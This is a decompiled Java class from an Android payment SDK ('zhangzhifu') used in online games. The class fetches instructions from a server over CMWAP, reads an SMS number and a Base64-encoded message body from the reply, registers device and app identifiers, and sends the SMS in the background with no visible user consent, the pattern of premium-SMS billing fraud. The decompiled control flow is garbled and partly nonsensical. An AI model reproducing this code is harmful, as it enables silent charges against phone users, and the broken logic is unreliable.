package com.zhangzhifu.sdk.onlinegame;

import android.os.AsyncTask;
import android.util.Base64;
import com.waterwest.mmlog.TrustInfo;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.mmq.xpayagent.model.MMQJsonParser;
import com.zhangzhifu.sdk.mmq.xpayagent.model.MMQJsonResponse;
import com.zhangzhifu.sdk.modle.MMQProcedure;
import com.zhangzhifu.sdk.modle.MMQWap;
import com.zhangzhifu.sdk.util.Tools;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.json.JSonParser_MMQ;
import com.zhangzhifu.sdk.util.json.MsgResponse_MMQ;
import com.zhangzhifu.sdk.util.sms.SendSMS;
import java.util.List;
import org.apache.http.HttpResponse;

final class c
  extends AsyncTask
{
  c(ZhangPayMMQF paramZhangPayMMQF, MMQWap paramMMQWap) {}
  
  private String s()
  {
    int k = this.cr.getAllProcedure().size();
    if (k == 0) {
      return null;
    }
    int i = 0;
    if (i >= k) {
      return null;
    }
    ZhangPayMMQF.a(this.cq, (MMQProcedure)this.cr.getAllProcedure().get(i));
    ZhangPayLog.d("zhangPay_log", "url是：" + ((MMQProcedure)this.cr.getAllProcedure().get(i)).getA_url());
    int j;
    if (ZhangPayMMQF.a(this.cq) != null)
    {
      ZhangPayMMQF.a(this.cq, ZhangPayMMQF.a(this.cq).getA_url());
      if ((ZhangPayMMQF.b(this.cq) != null) && (!ZhangPayMMQF.b(this.cq).trim().equals("")))
      {
        j = 0;
        if (j < 3) {
          break label160;
        }
      }
    }
    for (;;)
    {
      i += 1;
      break;
      label160:
      Object localObject3;
      int m;
      do
      {
        try
        {
          Object localObject1 = Tools.getContentByCMWAP(ZhangPayMMQF.b(this.cq) + "&contentid=" + null, Tools.getHeadersByDefault(ZhangPayMMQF.c(this.cq), null, null), ZhangPayMMQF.c(this.cq));
          if (localObject1 != null)
          {
            localObject1 = Tools.getBody((HttpResponse)localObject1, ZhangPayMMQF.c(this.cq));
            if (localObject1 != null)
            {
              ZhangPayMMQF.a(this.cq, JSonParser_MMQ.getMsgResponse((String)localObject1));
              localObject1 = this.cq;
              localObject1 = ZhangPayMMQF.b(ZhangPayMMQF.c(this.cq), ZhangPayMMQF.d(this.cq).getApiKey(), ZhangPayMMQF.d(this.cq).getAmount(), ZhangPayMMQF.d(this.cq).getOrder_no(), ZhangPayMMQF.d(this.cq).getChannel(), ZhangPayMMQF.d(this.cq).getApp_id());
              ZhangPayMMQF.a(this.cq, MMQJsonParser.getMsgResponse((String)localObject1));
              localObject1 = ZhangPayMMQF.e(this.cq).getSms_number();
              localObject2 = ZhangPayMMQF.e(this.cq).getSms();
              ZhangPayMMQF.e(this.cq).getPort();
              localObject3 = ZhangPayMMQF.e(this.cq).getPay_code();
              String str1 = ZhangPayMMQF.e(this.cq).getPackage_name();
              String str2 = ZhangPayMMQF.e(this.cq).getVersion();
              String str3 = ZhangPayMMQF.e(this.cq).getVersion_code();
              String str4 = ZhangPayMMQF.e(this.cq).getVersion_name();
              String str5 = ZhangPayMMQF.e(this.cq).getApp_id();
              String str6 = ZhangPayMMQF.e(this.cq).getChannel_id();
              String str7 = ZhangPayMMQF.e(this.cq).getProgram_id();
              String str8 = ZhangPayMMQF.e(this.cq).getEsm();
              String str9 = ZhangPayMMQF.e(this.cq).getMdh();
              String str10 = ZhangPayMMQF.e(this.cq).getPkm();
              String str11 = ZhangPayMMQF.e(this.cq).getTid();
              String str12 = ZhangPayMMQF.e(this.cq).getTimestamp();
              m = Integer.valueOf(ZhangPayMMQF.e(this.cq).getSend_type()).intValue();
              TrustInfo.auth(ZhangPayMMQF.c(this.cq), str1, str3, str4, str5, (String)localObject3, str11, str2, str6, str7, str12, str8, str9, str10);
              localObject3 = new SendSMS();
              if (m != 1) {
                continue;
              }
              localObject2 = Base64.decode(((String)localObject2).toString(), 0);
              ((SendSMS)localObject3).sendSMS(ZhangPayMMQF.c(this.cq), (String)localObject1, null, (byte[])localObject2);
              SharePreferUtil.setSendSMSMMQ(ZhangPayMMQF.c(this.cq), 1);
            }
          }
        }
        catch (Exception localException)
        {
          ZhangPayLog.d("zhangPay_log", "================发送短信发生错误");
          j += 1;
        }
        break;
      } while (m != 0);
      Object localObject2 = new String(Base64.decode(((String)localObject2).toString(), 0));
      ((SendSMS)localObject3).sendSMS(ZhangPayMMQF.c(this.cq), localException, (String)localObject2, null);
      SharePreferUtil.setSendSMSMMQ(ZhangPayMMQF.c(this.cq), 1);
    }
  }
}
